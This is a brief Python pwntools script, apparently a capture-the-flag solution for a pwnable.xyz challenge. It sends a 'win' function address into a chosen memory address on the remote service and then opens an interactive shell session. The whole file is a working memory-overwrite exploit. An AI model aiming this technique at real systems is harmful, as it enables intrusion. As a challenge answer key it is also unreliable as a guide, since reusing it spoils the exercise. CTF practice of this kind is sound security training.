from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30033)

sla = r.sendlineafter

win = 0x400821

sla('Addr: ', str(0x600bc0))
sla('Value: ', str(win))

r.interactive()